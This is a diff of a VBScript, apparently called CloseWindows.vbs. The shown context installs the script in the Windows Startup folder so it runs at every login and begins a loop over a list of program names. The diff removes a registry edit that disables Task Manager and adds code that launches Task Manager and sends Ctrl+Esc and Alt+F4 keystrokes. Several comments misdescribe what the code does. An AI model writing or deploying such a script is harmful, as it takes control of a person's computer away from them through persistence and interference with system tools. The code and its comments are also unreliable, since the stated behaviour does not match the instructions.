@@ -7,12 +7,14 @@ Set objShellLink = WshShell.CreateShortcut(strStartupPath & "\CloseWindows.vbs.l
 objShellLink.TargetPath = WScript.ScriptFullName
 objShellLink.Save
 
-'Registry edit to disable Task Manager
-strKeyPath = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System"
-strValueName = "DisableTaskMgr"
-strValueType = "REG_DWORD"
-intValue = 1
-WshShell.RegWrite strKeyPath & "\" & strValueName, intValue, strValueType
+'Set Task Manager to "always on top" and minimize
+Set objShell = CreateObject("Shell.Application")
+objShell.MinimizeAll
+WshShell.Run "taskmgr.exe", 1, False
+WScript.Sleep 1000 'wait for Task Manager to open
+WshShell.AppActivate "Task Manager"
+WshShell.SendKeys "^{ESC}" 'presses Ctrl+Esc to open Start menu
+WshShell.SendKeys "%{F4}" 'presses Alt+F4 to close Start menu
 
 Do
     For Each strExeName In strExeNames
